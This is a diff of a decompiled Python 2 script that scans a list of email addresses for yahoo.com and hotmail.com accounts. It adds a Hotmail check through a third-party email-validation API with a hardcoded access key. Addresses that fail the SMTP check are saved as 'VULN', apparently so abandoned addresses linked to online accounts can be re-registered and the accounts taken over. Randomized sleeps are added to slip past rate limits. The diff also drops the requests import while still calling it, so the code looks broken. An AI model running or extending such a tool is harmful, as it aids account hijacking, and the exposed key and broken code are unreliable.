@@ -2,17 +2,13 @@
 # Python bytecode 2.7
 # Decompiled from: Python 2.7.16 (default, Apr 24 2019, 10:05:31) 
 # [GCC 4.2.1 Compatible Android (5058415 based on r339409) Clang 8.0.2 (https://a
-import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, cookielib
-from multiprocessing.pool import ThreadPool
+#import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, cookielib
+import os, sys, time, datetime, random, re, json 
+#, urllib
 try:
     import mechanize
 except ImportError:
     os.system('pip2 install mechanize')
-else:
-    try:
-        import requests
-    except ImportError:
-        os.system('pip2 install requests')
 
 bgm = '\x1b[41m'
 p = '\x1b[0m'
@@ -56,14 +52,21 @@ def masuk():
         os.mkdir('output')
       except OSError:
         pass
-      save = open('output/Vuln'+i, 'w')
+      save = open('output/Vuln'+kun[plh-1], 'w')
+      timz=0
+      timzz=0
+      berhasil = []
       #open for read only
       with open(kun[plh - 1]) as fp:  
        for cnt, line in enumerate(fp):
          #print("Line {}: {}".format(cnt, line))
          if "yahoo.com" in line.split(',')[0] :
+          if timz == random.randrange(8, 15) : 
+            time.sleep(random.randrange(33, 60))
+            timz = 0
+          timz=timz+1
+
           print line.split(',')[0].strip()
-          berhasil = []
           try:
             mail = line.split(',')[0].strip()
             yahoo = re.compile('@.*')
@@ -85,10 +88,33 @@ def masuk():
           except KeyError:
             pass
 
+         if "hotmail.com" in line.split(',')[0] :
+          if timzz == random.randrange(8, 15) : 
+            time.sleep(random.randrange(33, 60))
+            timzz = 0
+          timzz=timzz+1
+
+          print line.split(',')[0].strip()
+          try:
+            mail = line.split(',')[0].strip()
+
+            url = ("http://apilayer.net/api/check?access_key=7a58ece2d10e54d09e93b71379677dbb&email=" + mail + "&smtp=1&format=1")
+            cek = json.loads(requests.get(url).text)
+
+            if cek['smtp_check'] == 0:
+              save.write(line.strip() + '\n')
+              print bgm + '[mVULN] ' + p + line
+              berhasil.append(line.strip())
+            else:
+		      print "Hotmail Not Vuln"
+          except KeyError:
+            pass
+
+
     print bgm + '------------------------------------'
-    print '\[mDone.'
-    print '\[+]Total : ' + str(len(berhasil))
-    print '\[+]File saved: /output/Vuln'+i
+    print '\[+]Done.'
+    print '\[+]Total: ' + str(len(berhasil))
+    print '\[+]File saved: /output/Vuln'+kun[plh - 1]
     save.close()
 
 if __name__ == '__main__':
